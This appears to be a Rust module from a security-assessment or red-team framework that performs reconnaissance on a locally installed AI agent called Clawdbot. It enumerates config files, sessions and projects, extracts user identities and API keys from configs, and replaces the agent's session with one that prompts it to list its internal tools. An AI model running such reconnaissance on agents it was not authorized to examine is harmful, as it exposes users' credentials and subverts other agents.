use super::{ClawdbotAgent, ClawdbotSession};
use crate::agent_connectors::traits::{Agent, AgentRecon, AgentSession};
use async_trait::async_trait;
use common::{AgentTool, ConfigItem, ReconResult, ReconTools, SessionContext};
use std::sync::Arc;

#[async_trait]
impl AgentRecon for ClawdbotAgent {
    async fn perform_recon(&self, is_semantic: bool) -> Option<ReconResult> {
        common::log_info!(
            "Performing recon (is_semantic={})",
            is_semantic
        );

        //
        // Get enumeration data.
        //
        let (config_items, sessions, project_paths) = match super::enumeration::enumerate() {
            Ok(data) => (data.config_items, data.sessions, data.project_paths),
            Err(e) => {
                common::log_warn!("Enumeration failed: {}", e);
                (Vec::new(), Vec::new(), Vec::new())
            }
        };

        //
        // Discover tools.
        //
        let mut tools = ReconTools::default();

        //
        // Semantic discovery: internal tools via agent query.
        //
        if is_semantic {
            let internal_tools = self.discover_internal_tools_semantically().await;
            tools.internal_tools = internal_tools;
        }

        //
        // Extract metadata (user identities, API keys) from config files.
        //
        let metadata = crate::agent_connectors::utils::extract_metadata_from_configs(
            self.name(),
            &config_items,
        )
        .await;

        common::log_info!(
            "Recon complete - {} config items, {} sessions, {} projects, metadata={}",
            config_items.len(),
            sessions.len(),
            project_paths.len(),
            metadata.is_some()
        );

        //
        // Strip contents from config items before returning. Contents are fetched
        // on-demand to avoid exceeding RabbitMQ message size limits.
        //
        let config: Vec<ConfigItem> = config_items.into_iter().map(|mut item| {
            item.contents = None;
            item
        }).collect();

        Some(ReconResult {
            tools,
            config,
            sessions,
            project_paths,
            metadata,
        })
    }
}

impl ClawdbotAgent {
    //
    // Discover internal tools by querying the agent via a temporary session.
    //
    async fn discover_internal_tools_semantically(&self) -> Vec<AgentTool> {
        let binary_path = match self.process_path.get() {
            Some(path) => path.clone(),
            None => {
                common::log_warn!("No binary path available for internal tools discovery");
                return Vec::new();
            }
        };

        //
        // Close any existing session.
        //
        {
            let mut guard = self.session.write().unwrap();
            if let Some(session) = guard.as_ref() {
                common::log_info!("Closing existing session for internal tools discovery");
                session.close();
            }
            *guard = None;
        }

        //
        // Use shared recon function to discover internal tools.
        //
        crate::agent_connectors::utils::discover_internal_tools_semantically(
            self.name(),
            crate::agent_connectors::utils::ToolDiscoveryPrompt::ListInternalTools,
            || {
                let temp_context = SessionContext::default();
                let session = ClawdbotSession::new(Some(binary_path.clone()), &temp_context)?;
                Ok(Arc::new(session) as Arc<dyn AgentSession>)
            }
        )
        .await
    }
}
